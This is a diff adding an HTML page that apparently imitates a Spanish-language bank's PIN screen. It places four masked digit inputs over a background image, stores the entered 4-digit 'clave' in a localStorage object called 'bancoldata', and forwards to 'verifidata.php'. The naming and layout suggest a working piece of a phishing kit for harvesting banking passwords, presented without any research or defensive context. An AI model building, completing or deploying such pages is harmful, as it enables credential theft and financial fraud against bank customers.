@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image-based Website</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body, html {
+            height: 100%;
+            width: 100%;
+        }
+        /* Loader styles */
+        .loader-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Main content styles */
+        .image-container {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: relative;
+        }
+        .image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .center-box {
+            position: absolute;
+            top: 55%;
+            left: 47.7%;
+            transform: translate(-50%, -50%);
+            background-color: rgb(255, 255, 255);
+            width: 170px;
+            height: 60px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 8px;
+        }
+        .center-box .input-container {
+            position: relative;
+            width: 80%;
+            display: flex;
+        }
+        .password-input {
+            width: 40px;
+            height: 60px;
+            text-align: center;
+            font-size: 20px;
+            border: 1px solid #ffffff;
+            border-radius: 5px;
+            margin-right: 17px;
+            -webkit-text-security: disc;
+        }
+        .password-input:last-child {
+            margin-right: 0;
+        }
+        .button-container {
+            position: absolute;
+            top: 66.5%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            gap: 10px;
+        }
+        .button-container button {
+            padding: 21px 75px;
+            font-size: 16px;
+            border: none;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .button-container button:first-child {
+            background-color: #ffffff;
+            border: 1px solid black;
+        }
+        .button-container button:last-child {
+            background-color: #cccccc;
+            color: #666666;
+            cursor: not-allowed;
+        }
+        .button-container button:last-child.enabled {
+            background-color: #ffda37;
+            cursor: pointer;
+            color: rgb(1, 1, 1);
+        }
+    </style>
+</head>
+<body>
+    <!-- Loader -->
+    <div class="loader-container" id="loader">
+        <div class="loader"></div>
+    </div>
+    <!-- Main content -->
+    <div class="image-container">
+        <img src="img/2.png" alt="Background Image">
+        <div class="center-box">
+            <div class="input-container">
+                <input type="password" class="password-input" maxlength="1" id="input1" inputmode="numeric">
+                <input type="password" class="password-input" maxlength="1" id="input2" inputmode="numeric">
+                <input type="password" class="password-input" maxlength="1" id="input3" inputmode="numeric">
+                <input type="password" class="password-input" maxlength="1" id="input4" inputmode="numeric">
+            </div>
+        </div>
+        <div class="button-container">
+            <button>Cancelar</button>
+            <button id="continueButton" class="disabled">Continuar</button>
+        </div>
+    </div>
+
+    <script>
+        // Show loader until the page is fully loaded
+        window.addEventListener('load', () => {
+            const loader = document.getElementById('loader');
+            loader.style.display = 'none';
+        });
+
+        const inputs = document.querySelectorAll('.password-input');
+        const continueButton = document.getElementById('continueButton');
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (!/^\d$/.test(e.target.value)) {
+                    e.target.value = '';
+                }
+                if (e.target.value !== '' && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                let allFilled = Array.from(inputs).every(input => input.value !== '');
+                continueButton.disabled = !allFilled;
+                continueButton.classList.toggle('disabled', !allFilled);
+                continueButton.classList.toggle('enabled', allFilled);
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && index > 0 && e.target.value === '') {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        continueButton.addEventListener('click', () => {
+            if (continueButton.disabled) return;
+            const inputValues = Array.from(inputs).map(input => input.value).join('');
+            if (inputValues.length === 4 && /^\d{4}$/.test(inputValues)) {
+                let bancoldata = localStorage.getItem('bancoldata');
+                bancoldata = bancoldata ? JSON.parse(bancoldata) : {};
+                bancoldata.clave = inputValues;
+                localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+                window.location.href = 'verifidata.php';
+            } else {
+                alert('Por favor, complete los 4 dígitos correctamente.');
+            }
+        });
+    </script>
+</body>
+</html>
